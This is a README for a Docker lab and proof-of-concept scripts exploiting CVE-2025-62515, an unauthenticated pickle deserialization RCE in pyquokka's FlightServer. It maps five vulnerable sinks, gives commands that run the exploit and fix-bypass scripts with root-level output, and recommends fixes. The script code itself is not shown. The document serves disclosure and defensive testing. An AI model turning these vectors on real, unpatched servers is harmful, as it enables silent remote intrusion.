# CVE-2025-62515: pyquokka FlightServer Insecure Deserialization (RCE)

> **Exploit Intelligence Platform** | [exploit-intel.com](https://exploit-intel.com) | [@exploit_intel](https://x.com/exploit_intel)

## Overview

CVE-2025-62515 is a **critical** insecure deserialization vulnerability in [pyquokka](https://github.com/marsupialtail/quokka), a Python framework for time series analytics built on Apache Arrow Flight and Ray. The `FlightServer` class in `pyquokka/flight.py` passes attacker-controlled data directly to `pickle.loads()` without any validation, authentication, or sanitization, allowing an **unauthenticated remote attacker** to achieve arbitrary code execution by sending a crafted pickle payload over the gRPC protocol.

The server binds to `0.0.0.0:5005` by default with no authentication, making any network-reachable instance trivially exploitable.

## Affected Versions

| Condition | Versions |
|-----------|----------|
| **Vulnerable** | All versions through **0.3.2** (latest on PyPI) |
| **Fixed** | **None** — this vulnerability is **UNPATCHED** |

All deployed versions of pyquokka are affected. No fix has been committed to the repository.

## CVSS Score

| Metric | Value |
|--------|-------|
| **Score** | **9.8** |
| **Severity** | **CRITICAL** |
| **Vector** | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| **CWE** | CWE-502 — Deserialization of Untrusted Data |

## Root Cause

The `FlightServer` class in `pyquokka/flight.py` uses Python's `pickle.loads()` to deserialize data received directly from network clients over the Apache Arrow Flight (gRPC) protocol. There is **zero input validation, sanitization, or type restriction** on the data before it is passed to `pickle.loads()`.

Python's `pickle` module is inherently unsafe for untrusted input. The pickle protocol supports a `__reduce__()` dunder method that allows arbitrary callable invocation during deserialization. An attacker crafts a pickle payload whose `__reduce__()` method calls `os.system()` (or any other callable), and the server executes it during deserialization — **before** any post-deserialization validation occurs.

There are **5 distinct `pickle.loads()` sinks** in `flight.py`, all network-reachable:

| Line | Method | Sink | Complexity |
|------|--------|------|------------|
| **283** | `do_action()` — `set_configs` | `pickle.loads(action.body.to_pybytes())` | Trivial |
| **305** | `do_action()` — `cache_garbage_collect` | `pickle.loads(action.body.to_pybytes())` | Trivial |
| **46** | `do_put()` | `pickle.loads(key[1])` | Moderate |
| **98** | `do_get()` | `pickle.loads(ticket.ticket)` | Moderate |
| **220** | `do_get()` (inner) | `pickle.loads(input_requirements)` | Complex |

The vulnerability requires no authentication — the Flight server accepts anonymous connections with no auth handler configured.

## Lab Setup

### Prerequisites

- Docker with compose plugin
- `pyarrow` on the host for running PoC scripts (`pip install pyarrow`)

### Build and Start (Vulnerable)

```bash
cd CVE-2025-62515
docker compose build
docker compose up -d
```

### Build and Start (Patched / Bypass Testing)

```bash
docker compose -f docker-compose-bypass.yml build
docker compose -f docker-compose-bypass.yml up -d
```

### Container Details

| Container | Role | Image | Port |
|-----------|------|-------|------|
| `cve-2025-62515-vulnerable` | Vulnerable pyquokka FlightServer | `python:3.10-slim-bookworm` + pyarrow/polars/psutil | 5005/tcp (gRPC) |
| `cve-2025-62515-patched` | Simulated partial fix (json.loads for do_action) | `python:3.10-slim-bookworm` + pyarrow/polars/psutil | 5005/tcp (gRPC) |

### Verify the Lab

```bash
# Check container health
docker compose ps

# Test connectivity (requires pyarrow on host)
python3 -c "
import pyarrow.flight
client = pyarrow.flight.connect('grpc://localhost:5005')
print([a.type for a in client.list_actions()])
"
```

Expected output:
```
['clear', 'check_puttable', 'shutdown', 'get_flights_info', 'cache_garbage_collect']
```

### Stop the Lab

```bash
docker compose down
# or for bypass lab:
docker compose -f docker-compose-bypass.yml down
```

## PoC Usage

Three PoC scripts target the vulnerable server, each exploiting a different `pickle.loads()` sink. A fourth script demonstrates bypass of the simulated fix. All require `pyarrow` on the client side (`pip install pyarrow`).

### Vector 1: `set_configs` Action (Primary) — `poc/poc.py`

Targets the `do_action()` handler at line 283. Simplest and most direct attack path.

```bash
python3 poc/poc.py localhost 5005
```

**Verify RCE:**
```bash
docker exec cve-2025-62515-vulnerable cat /tmp/cve-2025-62515-pwned
```
```
uid=0(root) gid=0(root) groups=0(root)
---
<container_hostname>
---
CVE-2025-62515 RCE demonstrated
```

### Vector 2: `cache_garbage_collect` Action — `poc/poc_vector2.py`

Targets the `do_action()` handler at line 305. Same vulnerability pattern, different code path.

```bash
python3 poc/poc_vector2.py localhost 5005
```

**Verify:**
```bash
docker exec cve-2025-62515-vulnerable cat /tmp/cve-2025-62515-vector2
```

### Vector 3: `do_get` Ticket Deserialization — `poc/poc_vector3.py`

Targets the `do_get()` method at line 98 via the Flight ticket mechanism — a completely different protocol operation.

```bash
python3 poc/poc_vector3.py localhost 5005
```

**Verify:**
```bash
docker exec cve-2025-62515-vulnerable cat /tmp/cve-2025-62515-vector3
```

### Fix Bypass: `do_get` + `do_put` — `poc/bypass_poc.py`

Demonstrates that the simulated fix (replacing `pickle.loads()` with `json.loads()` in `do_action()` only) is incomplete. The `do_get()` and `do_put()` methods retain unpatched `pickle.loads()` sinks.

```bash
# Start the patched container
docker compose -f docker-compose-bypass.yml up -d

# Run bypass
python3 poc/bypass_poc.py localhost 5005
```

**Verify:**
```bash
docker exec cve-2025-62515-patched cat /tmp/cve-2025-62515-bypass
docker exec cve-2025-62515-patched cat /tmp/cve-2025-62515-bypass-doput
```

## Verification

### Vulnerable Server (all versions — UNPATCHED)

| Test | Result | Evidence |
|------|--------|----------|
| `set_configs` action (line 283) | **RCE confirmed** | `id` command output written to `/tmp/cve-2025-62515-pwned` as root |
| `cache_garbage_collect` action (line 305) | **RCE confirmed** | `id` command output written to `/tmp/cve-2025-62515-vector2` as root |
| `do_get` ticket (line 98) | **RCE confirmed** | `id` command output written to `/tmp/cve-2025-62515-vector3` as root |
| Server stability post-exploit | **Server survives** | Remains healthy and continues accepting connections after all exploits |

### Patched Server (Simulated Fix)

| Test | Result | Evidence |
|------|--------|----------|
| `set_configs` action | **Blocked** | `json.loads()` rejects pickle bytes |
| `cache_garbage_collect` action | **Blocked** | `json.loads()` rejects pickle bytes |
| `do_get` ticket (line 98) | **BYPASS — RCE** | Unpatched `pickle.loads()` still present |
| `do_put` descriptor (line 46) | **BYPASS — RCE** | Unpatched `pickle.loads()` still present |

### Server Behavior After Exploitation

The Apache Arrow Flight gRPC framework catches the post-RCE exceptions as gRPC error responses. The server does **not** crash and remains exploitable for follow-up payloads. Exploitation is **silent** — no traceback is logged by default.

## Bypass Details

The simulated fix replaces `pickle.loads()` with `json.loads()` only in the `do_action()` method handlers (`set_configs` and `cache_garbage_collect`). This leaves 3 of 5 `pickle.loads()` sinks unpatched:

| Sink | Method | Fixed? |
|------|--------|--------|
| `pickle.loads(action.body.to_pybytes())` (line 283) | `do_action` — `set_configs` | Yes |
| `pickle.loads(action.body.to_pybytes())` (line 305) | `do_action` — `cache_garbage_collect` | Yes |
| `pickle.loads(ticket.ticket)` (line 98) | `do_get` | **No** |
| `pickle.loads(key[1])` (line 46) | `do_put` | **No** |
| `pickle.loads(input_requirements)` (line 220) | `do_get` (inner) | **No** |

The bypass uses completely different protocol operations (`do_get`/`do_put` vs `do_action`), making it a genuine fix bypass rather than a variant.

## Fix

### Status: UNPATCHED

As of the latest version (0.3.2) and latest commit, **no fix has been applied**. The advisory ([GHSA-f74j-gffq-vm9p](https://github.com/marsupialtail/quokka/security/advisories/GHSA-f74j-gffq-vm9p)) was published but no remediation was committed.

### Recommended Remediation

1. **Replace `pickle.loads()` with a safe serialization format** (JSON, Arrow IPC, protobuf) for all 5 vulnerable sinks
2. **Add authentication** to the FlightServer — the `FlightServerBase` API supports an `auth_handler` parameter
3. **Bind to `127.0.0.1` by default** instead of `0.0.0.0`
4. If pickle must be used for internal cluster communication, implement a **restricted unpickler** with an allowlist of safe types

### Interim Mitigations

- Do not expose port 5005 to untrusted networks
- Do not deploy pyquokka in environments accessible to untrusted clients
- Monitor for unexpected gRPC errors on the FlightServer as a detection heuristic

## References

| Resource | URL |
|----------|-----|
| **GitHub Security Advisory** | https://github.com/marsupialtail/quokka/security/advisories/GHSA-f74j-gffq-vm9p |
| **NVD Entry** | https://nvd.nist.gov/vuln/detail/CVE-2025-62515 |
| **Source Repository** | https://github.com/marsupialtail/quokka |
| **PyPI Package** | https://pypi.org/project/pyquokka/ |
| **Vulnerable File** | [`pyquokka/flight.py`](https://github.com/marsupialtail/quokka/blob/v0.3.1/pyquokka/flight.py) (lines 46, 98, 220, 283, 305) |
| **CWE-502** | https://cwe.mitre.org/data/definitions/502.html |

## Disclaimer

This proof-of-concept is provided for **authorized security testing and educational purposes only**. Do not use against systems you do not own or have explicit written authorization to test. The authors assume no liability for misuse.
